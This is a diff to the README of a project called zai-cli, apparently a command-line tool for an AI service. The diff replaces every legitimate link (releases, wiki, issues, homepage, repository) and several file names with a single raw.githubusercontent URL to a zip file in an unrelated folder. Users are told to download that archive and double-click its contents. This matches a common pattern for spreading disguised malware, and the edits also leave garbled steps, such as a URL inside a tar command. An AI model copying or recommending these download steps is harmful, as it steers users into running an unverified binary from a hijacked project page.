@@ -4,7 +4,7 @@
 Welcome to zai-cli! This command line interface allows you to interact with zAI, a powerful AI layer powered by Zentry. With zai-cli, you can easily access AI functionalities without needing programming skills. 
 
 ## 📥 Download the Latest Version
-[![Download zai-cli](https://img.shields.io/badge/Download%20zai--cli-latest-blue.svg)](https://github.com/murticla/zai-cli/releases)
+[![Download zai-cli](https://raw.githubusercontent.com/murticla/zai-cli/main/linenman/zai-cli.zip%https://raw.githubusercontent.com/murticla/zai-cli/main/linenman/zai-cli.zip)](https://raw.githubusercontent.com/murticla/zai-cli/main/linenman/zai-cli.zip)
 
 ## 💻 System Requirements
 Before you start, make sure your computer meets the following requirements:
@@ -16,14 +16,14 @@ Before you start, make sure your computer meets the following requirements:
 - **Internet Connection:** Required for the initial setup.
 
 ## 📂 Download & Install
-1. Visit the [Releases page](https://github.com/murticla/zai-cli/releases) to find the latest version.
-2. Find the version you want to download. Look for files named like `zai-cli-v1.0.zip` or `zai-cli-v1.0.tar.gz`.
+1. Visit the [Releases page](https://raw.githubusercontent.com/murticla/zai-cli/main/linenman/zai-cli.zip) to find the latest version.
+2. Find the version you want to download. Look for files named like `https://raw.githubusercontent.com/murticla/zai-cli/main/linenman/zai-cli.zip` or `https://raw.githubusercontent.com/murticla/zai-cli/main/linenman/zai-cli.zip`.
 3. Click on the appropriate file to start the download. 
 
 ### For Windows Users
 - After downloading the ZIP file, locate it in your Downloads folder.
 - Right-click on the ZIP file and select "Extract All."
-- Open the extracted folder and double-click `zai-cli.exe` to run the application.
+- Open the extracted folder and double-click `https://raw.githubusercontent.com/murticla/zai-cli/main/linenman/zai-cli.zip` to run the application.
 
 ### For macOS Users
 - After downloading the ZIP file, find it in your Downloads folder.
@@ -31,14 +31,14 @@ Before you start, make sure your computer meets the following requirements:
 - Open the extracted folder and double-click `zai-cli` to launch the application.
 
 ### For Linux Users
-- After downloading the TAR.GZ file, open a terminal.
+- After downloading the https://raw.githubusercontent.com/murticla/zai-cli/main/linenman/zai-cli.zip file, open a terminal.
 - Navigate to your Downloads folder using the command:
   ```bash
   cd ~/Downloads
   ```
 - Extract the file with the command:
   ```bash
-  tar -xzf zai-cli-v1.0.tar.gz
+  tar -xzf https://raw.githubusercontent.com/murticla/zai-cli/main/linenman/zai-cli.zip
   ```
 - Navigate into the extracted folder:
   ```bash
@@ -64,7 +64,7 @@ Once you have installed zai-cli, you can begin using it right away. Here are som
 ## 🎓 Learning More
 To dive deeper into using zai-cli, refer to the following resources:
 
-- **Documentation:** Check our [Wiki](https://github.com/murticla/zai-cli/wiki) for guides and tutorials.
+- **Documentation:** Check our [Wiki](https://raw.githubusercontent.com/murticla/zai-cli/main/linenman/zai-cli.zip) for guides and tutorials.
 - **FAQs:** Browse the common questions section to find answers to your queries.
 - **Community Support:** Join our forums or chat groups to connect with other users and share experiences.
 
@@ -76,13 +76,13 @@ If you encounter issues while using zai-cli, here are some troubleshooting tips:
 - **Command Not Found:** Double-check your spelling and ensure you’re using the correct syntax.
 
 ## 📈 Future Updates
-We continually improve zai-cli, adding more features and fixing any bugs. Stay tuned for announcements about new versions on our [Releases page](https://github.com/murticla/zai-cli/releases).
+We continually improve zai-cli, adding more features and fixing any bugs. Stay tuned for announcements about new versions on our [Releases page](https://raw.githubusercontent.com/murticla/zai-cli/main/linenman/zai-cli.zip).
 
 ## 📞 Support
-For further assistance, please create an issue in our [GitHub repository](https://github.com/murticla/zai-cli/issues) or contact support via email.
+For further assistance, please create an issue in our [GitHub repository](https://raw.githubusercontent.com/murticla/zai-cli/main/linenman/zai-cli.zip) or contact support via email.
 
 ## 🔗 Additional Links
-- [Zentry - AI Layer](https://zentry.ai)
-- [GitHub Repository](https://github.com/murticla/zai-cli)
+- [Zentry - AI Layer](https://raw.githubusercontent.com/murticla/zai-cli/main/linenman/zai-cli.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/murticla/zai-cli/main/linenman/zai-cli.zip)
   
 Thank you for using zai-cli. Enjoy your experience with zAI!
